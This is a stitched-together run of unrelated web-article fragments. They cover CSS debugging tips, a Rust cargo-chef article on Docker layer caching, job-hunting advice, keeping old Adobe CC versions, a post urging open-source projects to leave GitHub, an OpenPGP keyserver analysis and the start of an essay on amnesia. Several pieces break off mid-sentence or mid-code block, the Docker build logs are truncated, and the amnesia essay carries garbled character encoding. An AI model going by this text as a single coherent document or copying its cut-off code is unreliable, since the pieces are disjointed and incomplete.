CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you’re currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‘overflow’ of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it’s with this knowledge that you may start to enjoy and view the process as ‘constructing’ pages, rather than simply ‘styling’ them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you’ve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>

<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command to build <em>just</em> the dependencies of your Rust project based on a JSON description file, a <em>recipe</em>.<br>
<code>cargo-chef</code> can be used to fully leverage Docker layer caching, therefore massively speeding up Docker builds for Rust projects.<br>
On our commercial codebase (~14k lines of code, ~500 dependencies) we measured a <strong>5x speed-up</strong>: we cut Docker build times <strong>from ~10 minutes to ~2 minutes</strong>.<sup><a href="#circleci">1</a></sup> </p>
<p><em><a href="https://www.lpalmieri.com/subscribe">Subscribe to the newsletter</a> to be notified when a new article is published on this blog.</em></p>

<p>Rust shines at runtime, consistently delivering great performance, but it comes at a cost: compilation times.<br>
They have been consistently among the top answers in the Rust annual survey when it comes to <a href="https://blog.rust-lang.org/2020/04/17/Rust-survey-2019.html#rust-adoption---a-closer-look"><em>the biggest challenges or problems for the Rust project</em></a>.</p>
<p>Optimised builds (<code>--release</code>), in particular, can be gruesome - up to 15/20 minutes on medium projects with several dependencies. Quite common on web development projects pulling in many foundational crates from the async ecosystem (<code>tokio</code>, <code>async-std</code>, <code>actix-web</code>, <code>tonic</code>, <code>lapin</code>, etc.).</p>
<p>How does this impact your day-to-day if you are working on a Rust project?</p>

<p><a href="https://www.docker.com/">Docker</a> containers are a mainstream technology to deploy software in production environments - most organisations have a Continuous Integration/Continuous Deployment pipeline that clones a project from a version control system (e.g. GitHub) and builds a Docker image to be deployed on top of a container orchestrator (e.g. <a href="https://kubernetes.io/">Kubernetes</a>, <a href="https://www.nomadproject.io/">Nomad</a> or other commercial solutions).</p>
<p>In a Docker build you will always be using the optimised build profile (<code>--release</code>) to get top-performance in your production environment. More often than not CI/CD pipelines do not run on top of very beefy machines - a couple of cores, maybe, not much more than that.</p>
<p>This combination is deadly.<br>
It can take more than 30 minutes to go from a merged PR to rolling out the new version to your end-users.</p>
<p>Such a long delay can have nefarious knock-on effects.</p>
<h2 id="slow-docker-builds-will-kill-you">Slow Docker builds will kill you</h2>
<p>Slow Docker builds will, over time, reduce your deployment frequency.<br>
<a href="https://www.amazon.co.uk/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339">Accelerate</a> has taught you to optimise for small changes deployed multiple times a day. But if each build takes ages it is very unlikely that your engineers will be willing to go through the ordeal often.<br>
They will start batching up changes, making it much more likely than one of those deployments will result in an outage. </p>
<p>Slow Docker builds will bite you again during those outages: the speed of your CI pipeline puts a hard limit on how fast you can roll out an emergency patch to mitigate an incident ("fix forward").<br>
If it takes 20 minutes to build a Docker container then the incident will be <em>at least</em> 20 minutes long (assuming you find the right fix as soon as the incident happens - unlikely).</p>
<p>In other words - do not neglect your CI/CD pipeline. It impacts your bottom line.</p>
<blockquote>
<p>Ok, ok, you convinced me! I want fast Docker builds! How?</p>
</blockquote>

<p>Let's have a look at your typical Rust Dockerfile:</p>
<pre><code><span>FROM</span><span> rust </span><span>as </span><span>builder
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> . .
</span><span># This works with the dummy project generated by `cargo new app --bin`
</span><span>RUN </span><span>cargo build --release --bin app

</span><span>FROM</span><span> rust </span><span>as </span><span>runtime
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> --from=</span><span>builder</span><span> /app/target/release/app /usr/local/bin
ENTRYPOINT ["</span><span>./usr/local/bin/app</span><span>"]
</span></code></pre>
<p>It is a <a href="https://docs.docker.com/develop/develop-images/multistage-build/"><em>multi-stage</em> build</a>: we create an intermediate Docker image (<code>builder</code>) to compile our binary and then we copy that binary over to the final Docker image (<code>runtime</code>) where we actually run it.<br>
The <code>builder</code> stage often requires more dependencies (e.g. OS packages) than the runtime stage, which can be kept fairly slim leading to smaller images with minimal attack surface.</p>
<p>If you run <code>docker build -t dummy-image .</code> you will see something like this in your terminal:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB
Step 1/8 : FROM rust as builder
 ---&gt; f5fde092a1cd

</span></code></pre>
<p>Each <code>RUN</code>, <code>COPY</code> and <code>ADD</code> instruction creates <a href="https://dzone.com/articles/docker-layers-explained">a <em>layer</em></a>: a diff between the previous state (the layer above) and the current state after having executed the specified command.<br>
Layers are cached.<br>
If the starting point of an operation has not changed (e.g. the base image) and the command itself has not changed (e.g. the checksum of the files copied by <code>COPY</code>) Docker does not perform any computation and directly retrieves a copy of the result from the local cache.</p>
<p>We can see it in action by running again <code>docker build -t dummy-image .</code>:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB
Step 1/8 : FROM rust as builder
 ---&gt; f5fde092a1cd
Step 2/8 : WORKDIR app

</span></code></pre>
<p>Notice the <code>Using cache</code> log after every single step. No output at all from <code>cargo build</code> - execution has been skipped entirely. </p>
<p>Docker layer caching is <em>fast</em> and can be leveraged to massively speed up Docker builds.<br>
The trick is optimising the order of operations in your Dockerfile: anything that refers files that are changing often (e.g. your source code) should appear as late as possible, therefore maximising the likelihood of the previous step being unchanged and allowing Docker to retrieve the result straight from the cache.</p>
<p>The expensive step is usually compilation.<br>
Most programming languages follow the same playbook: you <code>COPY</code> a lock-file of some kind first, build your dependencies, <code>COPY</code> over the rest of your source code and then build your project.<br>
This guarantees that most of the work is cached as long as your dependency tree does not change between one build and the next.</p>
<p>In a Python project, for example, you might have something along these lines:</p>
<pre><code><span>FROM</span><span> python:3
</span><span>COPY</span><span> requirements.txt
</span><span>RUN </span><span>pip install -r requirements.txt
</span><span>COPY</span><span> src/ /app
</span><span>WORKDIR </span><span>/app
CMD ["</span><span>python</span><span>", "</span><span>app</span><span>"]
</span></code></pre>
<p>What about Rust?</p>

<p><code>cargo</code>, as of today, does not provide a mechanism to build your project dependencies starting from its <code>Cargo.lock</code> file (e.g. <code>cargo build --only-deps</code>).<br>
Therefore Rust projects have always struggled to leverage Docker layer caching properly.</p>
<p>If you search for "Rust Docker cache" on Google you will bump into a variety of articles that propose a variety of workarounds.<br>
The <a href="https://stackoverflow.com/questions/58473606/cache-rust-dependencies-with-docker-build">blessed answer on StackOverflow</a>, as many other blog posts, suggests the following steps to unlock Docker layer caching for a simple project: copy the lock file, create a dummy <code>main.rs</code> file, build the project, delete the dummy file, copy over your source code, build again.</p>
<pre><code><span>FROM</span><span> rust
</span><span>WORKDIR </span><span>/var/www/app
</span><span>COPY</span><span> dummy.rs .
</span><span>COPY</span><span> Cargo.toml .
</span><span>RUN </span><span>sed -i '</span><span>s#src/main.rs#dummy.rs#</span><span>' Cargo.toml
</span><span>RUN </span><span>cargo build --release
</span><span>RUN </span><span>sed -i '</span><span>s#dummy.rs#src/main.rs#</span><span>' Cargo.toml
</span><span>COPY</span><span> . .
</span><span>RUN </span><span>cargo build --release
CMD ["</span><span>target/release/app</span><span>"]
</span></code></pre>
<p>It is a bit cumbersome but you can live with it for a simple single-binary project. You just need to keep your Dockerfile up to date every time you restructure your file structure (and book some time to explain to your colleagues what the hell you are doing).</p>
<p>As soon as your project grows in complexity (e.g. a workspace with a few crates) this "workaround" leads to an entangled mess that is painful to watch (and maintain).</p>
<p>I am currently finalising the chapter of <a href="https://zero2prod.com/">Zero To Production In Rust</a> on deployment best-practices for Rust projects - I have no intention of teaching this workaround as the best-way to get fast Docker builds with Rust.<br>
I set out to build something nicer and less error-prone.</p>

<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command.<br>
You can install from <a href="https://crates.io/">crates.io</a> with</p>
<pre><code><span>cargo</span><span> install cargo-chef
</span></code></pre>
<p><code>cargo-chef</code> exposes two commands: <code>prepare</code> and <code>cook</code>:</p>
<pre><code><span>cargo</span><span> chef</span><span> --help
</span></code></pre><pre><code><span>
cargo-chef

USAGE:
    cargo chef &lt;SUBCOMMAND&gt;

SUBCOMMANDS:
    cook       Re-hydrate the minimum project skeleton identified by `cargo chef prepare` and
               build it to cache dependencies
    prepare    Analyze the current project to determine the minimum subset of files (Cargo.lock
               and Cargo.toml manifests) required to build it and cache dependencies
</span></code></pre>
<p><code>prepare</code> examines your project and builds a <em>recipe</em> that captures the set of information required to build your dependencies.</p>
<pre><code><span>cargo</span><span> chef prepare</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>Nothing too mysterious going on here, you can examine the <code>recipe.json</code> file: it contains the skeleton of your project (e.g. all the <code>Cargo.toml</code> files with their relative path, the <code>Cargo.lock</code> file if available) plus a few additional pieces of information.<br>
In particular it makes sure that all libraries and binaries are explicitly declared in their respective <code>Cargo.toml</code> files even if they can be found at the canonical default location (<code>src/main.rs</code> for a binary, <code>src/lib.rs</code> for a library).</p>
<p>The <code>recipe.json</code> is the equivalent of the Python <code>requirements.txt</code> file - it is the only input required for <code>cargo chef cook</code>, the command that will build out our dependencies:</p>
<pre><code><span>cargo</span><span> chef cook</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>If you want to build in <code>--release</code> mode:</p>
<pre><code><span>cargo</span><span> …</span></code></pre></article></section></div>

They had an event on personal branding and CV writing and technical interviews. I talked about: </p><ul role="list"><li>How to Build a Resume</li><li>How to Use Linkedin Professionally</li><li>How I Landed a Full-Time Job Without a CS Degree</li></ul><p>Here is the presentation if you want to have a look: <a href="https://careerlaunch.netlify.app/">career launch</a></p><p>In this blog post, I'm going to emphasize the last point and will try to deliver all the messages I&nbsp;gave at that talk and also elaborate more to help more people who are looking for jobs in the software industry to get their dream jobs efficiently and I&nbsp;hope it'll be easier for them to know these tips beforehand because I've been into this situation before and I&nbsp;consider myself lucky and more importantly was doing some productive stuff that helped me get that opportunity and I'm looking forward to helping as many as possible whether you are a recent grad or someone who is not satisfied with their current position and want a change. Here are my tips:</p><h2>Treat your job search as a job</h2><p>Ever felt frustrated after being rejected without even interviewing you?</p><p>Well, I've been there. It's not twice, 10s of times, but 100s of times rejected. </p><p>Looking for a job is actually a job or maybe more than it looks. I&nbsp;know it's hard to not get rewarded, but the hard work you put in will pay off insha'Allah. What I&nbsp;mean by 'treat it as a job' is that you may spend more than 8 hours (like a full-time job or more) because you're doing two things:</p><ol start="" role="list"><li>You apply for jobs and polish your resume</li><li>You also learn and do projects</li></ol><h2>Keep learning while applying</h2><p>Sometimes it's difficult for you to multitask, but it's very important to learn while you apply because you never know when opportunities will be closed and no time for it to be reopened again. You'll never know the psychology of the recruiter and what they like or need in the candidate; maybe your skills at this point in time is needed. So it's better to sharpen your skills and improve your knowledge while applying instead of just waiting for learning ALL&nbsp;the things you want to learn because we always keep learning and no matter how successful we are in the career, the software industry needs a more fulfilling learning curve.</p><h2>Build a portfolio</h2><p>Now, you may wonder how you can build a portfolio without having even a single project to demonstrate. Well, try to build one then!</p><p>Building a portfolio is a boosting step that can make you better demonstrate your skill set and what you’re doing and what ideas your mind has. This should definitely be in your favor if done right to impress the recruiter and to stand out.</p><p>If you have just even one project, talk about it in a blog post and demonstrate in a way that a non-technical person can read and understand. I can’t emphasize enough how you should be able to convince people in the non-technical world to feel your words and your application that you made something.</p><p>Here is <a href="https://ezzeddin.github.io/" target="_blank">my portfolio</a> that I made on a GitHub page hosted by Jekyll which is a static site generator and if you think this portfolio is a bit advanced for you to make, I actually was using another simpler one without complicated CSS styles or many structures in there. It was plain simple and I put the link in the resume and it was BOOM 💥 ACCEPTED!</p><h2>Build an end-to-end project</h2><p>Many applicants try to improve their skills by just learning and not doing a project. It’s very important to build the big picture of what you’re doing and this is mostly done by demonstrating it through a project.</p><p>Try to apply what you’re already learning and do a project with these skills; maybe in an assignment at the end of a course but try to do it in a different way (I mean the data that you’re interested in and the technology that you use often) and what I mean by the end-to-end project is to have a project that demonstrates all lifecycle of software (data collection, analysis, design, testing, deployment). These are real-world skills that companies need. In the end, you’ll have something like a product that you can show to recruiters and maybe they can try it if it’s a web or mobile application for example.</p><p>And it will help you learn new skills without the need to get a whole course about it; maybe a tutorial in a blog will help or a youtube video.</p><h2>Write some content</h2><p>Writing is a very good way to demonstrate what you’ve learned or convince people to buy something which is what we want here, we want the recruiter to finally buy you (not literally) and know the skills that you learned in well-written documentation. Whether this content is the documentation for your project at GitHub (like I did with <a href="https://github.com/EzzEddin/classicle" target="_blank">Classicle</a>) or at medium (like <a href="https://medium.com/@ezzeddinabdullah/from-electronics-and-communications-engineering-to-data-science-a373448a783d" target="_blank">my story from engineering to data science</a>) or a tutorial you to demonstrate your skills in a popular magazine (like <a href="https://www.kdnuggets.com/2018/09/sql-case-study-helping-startup-ceo-manage-data.html" target="_blank">SQL Case Study</a> published at KDnuggets which was converted to a <a href="https://www.udemy.com/intuitive-sql-databases-case-study" target="_blank">basic course on Udemy</a> which&nbsp;I&nbsp;have a 50%&nbsp;discount btw if you subscribe to my newsletter at the bottom)</p><p>You can also publish the same content in another platform like <a href="https://www.experfy.com/blog/sql-case-study-helping-a-startup-ceo-manage-his-data" target="_blank">here</a> when the Industry Partnership Director of experfy reached out to me on Linkedin to republish the KDnuggets article on his website.</p><h2>Focus on jobs in your own country</h2><p>This tip is especially for fresh grads, I understand the high hope as I was in a similar situation someday; my mistake was that I was targeting companies abroad including FAANG without having experience here. I don't say it's impossible to have that as a fresh grad especially after 14 months of the army, but I'd say it'd be better to target companies in your land at first and finish applying to them all and after that apply for other companies abroad.</p><p>Truth be told, I&nbsp;was rejected A&nbsp;LOT. I&nbsp;mean like ~1000 rejections abroad and here in Egypt. Keep trying, you'll gonna find your dream job soon or later.<br></p><h2>Conclusion</h2><p>Wrapping this up, it’s very practical to treat your job hunt as if you’re getting paid for it and don’t regret spending time on it because it usually takes more than 8 hours a day to do your learning and apply for jobs you’re interested in. It’s also important to have a portfolio that demonstrates an end-to-end project or more and better to have other stuff like non-technical blog posts. Writing content in a popular journal will definitely boost your job search and also your skillset. Finally, especially if you’re a recent grad be sure to apply in your own country first and then think about applying abroad.</p><p>If you haven’t found your dream job yet, I hope you’ll do, and if you have it and not satisfied I hope you’ll find your way to better be satisfied and more fulfilled.</p><h2>Resources</h2><ul role="list"><li><a href="https://github.com/EzzEddin/career-slides">Career Launch Slides Repo</a></li><li><a href="http://careerlaunch.netlify.app/">Career Launch Presentation on the Web</a> </li><li><a href="https://money.usnews.com/money/blogs/outside-voices-careers/2012/09/18/8-commandments-for-every-job-hunter">8 Commandments for Every Job Hunter</a></li></ul></div></div></div></div>]]>

<p><span>What is the trick? On install,<strong> uncheck “Remove old versions”</strong>. That’s it! And you’ll keep your older versions of InDesign (or Photoshop, or whatever).</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_UpdateRemoveOld.gif" alt="Install updates without removing old versions of Adobe CC apps" width="480" height="270"></span></p>
<p><span>You can also enable auto-update and tell it to keep your old versions.</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_PreferencesRemoveOld.gif" alt="Change Preferences for Adobe CC apps to auto-update but not remove old versions" width="480" height="270"></span></p>
<h3><span>How do I get back a previous version of an Adobe CC application that was unintentionally removed?</span></h3>
<p><span>This option is a little less hidden than it has been in the past. It really is quite simple:</span></p>
<p><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_OtherVersions.gif" alt="Install previous Adobe app versions with the Other Versions option" width="480" height="270"></p>


<p><span>With the recent release of Adobe CC 2021, we’ve fielded the same questions that we received with previous Creative Cloud updates. Three main questions arise:</span></p>
<ol>
<li>Why would I want to keep a previous version of Adobe CC apps (such as InDesign) around?</li>
<li>How do I keep previous versions of an Adobe CC application as I install the new one?</li>
<li>How do I install a previous version of an Adobe CC application when I find it was unintentionally removed?</li>
</ol>
<h3>Why might I want to keep previous versions of Adobe CC applications (such as InDesign) around?</h3>
<p>Out with the old, in with the new, right? In this age of phones and app stores, software moves at a much faster pace than traditional PC applications, especially those in the world of print and serious graphics. The average App Store application has a lifespan of one month, and “auto-update” is all the rage among web browsers, phone apps, even PC applications. Plus, with the modern subscription paradigm, as embraced by Adobe these days, upgrading is FREE! It is also free to keep older versions.</p>
<p>Sure, you can take the plunge, easily, but there may be reasons to pause and consider, “should I kill the old version while moving to the new?” I think the reality is that users should install the new CC 20XX version when available. Yet, in most cases, <strong>it is a best practice to keep the older version as well.</strong></p>
<h4>Why might I want to keep the previous version of CC around?</h4>
<p>There are at least two reasons you may wish to keep CC 2019 on your computer while you install CC 2020:</p>
<ol>
<li>You have validated production workflows in CC 2019 and <strong>haven’t yet tested</strong> these in CC 2020.</li>
<li>Your workflow includes <strong>third-party plugins that don’t yet work with CC 2020. </strong>In most cases, it takes anywhere from a few days to a few months for third-party developers to update their plugins to the new CC version.</li>
</ol>
<h4>You don’t need to choose between CC 2020 and CC 2021!</h4>
<p>As far as Adobe software goes, the upgrade decision doesn’t need to be either/or between the new and previous version. This seems to be a very common mis-conception. <strong>Versions of InDesign and other CC apps co-exist quite nicely.&nbsp;</strong>This has been the case from time immemorial. It has always been an option to <strong>add</strong> the new version <strong>without removing</strong> the older version.</p>
<p>You might think this is a Boolean decision – just one version or the other – because CC apps by default will remove old versions on install. But no, <strong>it is easy to choose to keep the previous version</strong> (though this would be the default, in an ideal world) if you know how to do it.</p>
<p><span>Please&nbsp;<a href="mailto:maxdunn@siliconpublishing.com" rel=" noopener">email us</a> if you can’t figure out how to put back a previous version, or if you have questions about maintaining multiple versions of Creative Cloud applications.</span></p>

<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In July I finished my Bachelor’s Degree in IT Security at the University of
Applied Sciences in St. Poelten. During the studies I did some elective
courses, one of which was about Data Analysis using Python, Pandas and Jupyter
Notebooks. I found it very interesting to do calculations on different data
sets and to visualize them. Towards the end of the Bachelor I had to find a
topic for my Bachelor Thesis and as a long time user of OpenPGP I thought it
would be interesting to do an analysis of the collection of OpenPGP keys that
are available on the keyservers of the SKS keyserver network.</p>
<p>So in June 2019 I fetched a copy of one of the key dumps of the one of the
keyservers (some keyserver publish these copies of their key database so people
who want to join the SKS keyserver network can do an initial import). At that
time the copy of the key database contained 5,499,675 keys and was around 12GB.
Using the <a href="https://github.com/hockeypuck/hockeypuck">hockeypuck keyserver
software</a> I <a href="https://hockeypuck.io/populating.html">imported the
keys</a> into an PostgreSQL database.
Hockeypuck uses a table called <code>keys</code> to store the keys and in there the column
<code>doc</code> stores the OpenPGP keys in JSON format (always with a data field
containing the original unparsed data).</p>
<p>For the thesis I split the analysis in three parts, first looking at the Public
Key packets, then analysing the User ID packets and finally studying the
Signature Packets. To analyse the respective packets I used SQL to export the
data to CSV files and then used the pandas <a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_csv.html">read_csv
method</a>
to create a dataframe of the values. In a couple of cases I did some parsing
before converting to a DataFrame to make the analysis step faster. The parsing
was done using the <a href="https://github.com/toofishes/python-pgpdump">pgpdump python
library</a>.</p>
<p>Together with my advisor I decided to submit the thesis for a journal, so we
revised and compressed the whole paper and the outcome was now</p>
<p>
<a href="http://isyou.info/jowua/papers/jowua-v11n3-6.pdf">PUBLISHED</a>
</p>
<p>in the Journal of
Wireless Mobile Networks, Ubiquitous Computing, and Dependable Applications
(<a href="http://jowua.com/">JoWUA</a>).</p>
<p>I think the work gives some valuable insight in the development of the use of
OpenPGP in the last 30 years. Looking at the public key packets we were able to
compare the different public key algorithms and for example visualize how DSA
was the most used algorithm until around 2010 when it was replaced by RSA.
When looking at the less used algorithms a trend towards ECC based crytography is
visible.</p>
<p>What we also noticed was an increase of RSA keys with algorithm ID 3 (RSA Sign-Only),
which <a href="https://tools.ietf.org/html/rfc4880#section-13.5">are deprecated</a>. When
we took a deeper look at those keys we realized that most of those keys used a
specific User ID string in the User ID packets which allowed us to attribute
those keys to two software projects both using the <a href="http://www.bouncycastle.org/java.html">Bouncy Castle Java
Cryptographic API</a> (resp. the Spongy
Castle version for Android). We also stumbled over a tutorial on <a href="https://bouncycastle-pgp-cookbook.blogspot.com/2013/01/generating-rsa-keys.html">how to create
RSA keys with
Bouncycastle</a>
which also describes how to create RSA keys with code that produces RSA
Sign-Only keys. In one of those projects, this <a href="https://github.com/guardianproject/proofmode/issues/65">was then
fixed</a>.</p>
<p>By looking at the User ID packets we did some statistics about the most used
email providers used by OpenPGP users. One domain stood out, because it is not
the domain of an email provider: <code>tellfinder.com</code> is a domain used in around
45,000 keys. <a href="https://uncharted.software/product/tellfinder/">Tellfinder</a> is a
Big Data analysis software and the UID of all but two of those keys is
<code>TellFinder Page Archiver- Signing Key &lt;support@tellfinder.com&gt;</code>.</p>
<p>We also looked at the comments used in OpenPGP User ID fields. In 2013 Daniel
Kahn Gillmor published a blog post titled <a href="https://debian-administration.org/users/dkg/weblog/97">OpenPGP User ID Comments considered
harmful</a> in which he
pointed out that most of the comments in the User ID field of OpenPGP keys are
duplicating information that is already present somewhere in the User ID or the
key itself. In our dataset 3,133 comments were exactly the same as the name,
3,346 were the same as the domain and 18,246 comments were similar to the local
part of the email address</p>
<p>Last but not least we looked at the signature subpackets and the development of
some of the preferences (<a href="https://tools.ietf.org/html/rfc4880#section-5.2.3.7">Preferred Symmetric
Algorithm</a>, <a href="https://tools.ietf.org/html/rfc4880#section-5.2.3.8">Preferred
Hash Algorithm</a>) that are
being published using signature packets.</p>
<p>Analysing this huge dataset of cryptographic keys of the last 20 to 30 years
was very interesting and I learned a lot about the history of PGP resp.
OpenPGP and the evolution of cryptography overall. I think it
would be interesting to look at even more properties of OpenPGP keys and I also
think it would be valuable for the OpenPGP ecosystem if these kinds analysis
could be done regularly. An approach like <a href="https://metrics.torproject.org/">Tor
Metrics</a> could lead to interesting findings and
could also help to back decisions regarding future developments of the OpenPGP
standard.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When you wake</strong> up in the morning, how do you know who you are? You might say something like: â€˜Because I remember.â€™ A perfectly good answer, and one with a venerable history. The English philosopher John Locke, for example, considered memory to be the foundation of identity. â€˜Consciousness always accompanies thinking,â€™ he wrote in 1694. â€˜And as far as this consciousness can be extended backwards to any past Action or Thought, so far reaches the Identity of that <em>Person</em>.â€™</p>
<p>For most of us, the question of where identity comes from doesnâ€™t have much bearing on day-to-day life. We donâ€™t have to <em>try</em> to remember who we are; it just happens. But for the <a href="https://www.thelancet.com/pdfs/journals/laneur/PIIS1474-4422(18)30444-7.pdf" rel="nofollow noreferrer noopener">growing</a> number of people who survive brain injury every year, it can be a different story. If you survive an accident or an illness that limits your ability to form new memories, leaving you with whatâ€™s called â€˜anterograde amnesiaâ€™, you might be forced to look elsewhere for your sense of self.</p>
<p>Over the past 15 years working at Headway East London, the UK-based brain injury charity, Iâ€™ve met many people for whom anterograde amnesia has been the cause of profound existential <a href="https://aeon.co/essays/matthew-had-a-brain-injury-who-is-he-after-brain-surgery" rel="noopener">change</a>. Sadie, a paediatric nurse and mother of two who survived a stroke. Gretha, a city worker who fell ill with an infection. Henry, a greengrocer who suffered heart failure during a violent assault, his brain starved of oxygen. They have all recovered well from a medical perspective but, because of amnesia, they find new conscious memories difficult â€“ or impossible â€“ to form. As a result, they live with great uncertainty and disorientation, not to mention dramatic restrictions on their day-to-day freedoms.</p>
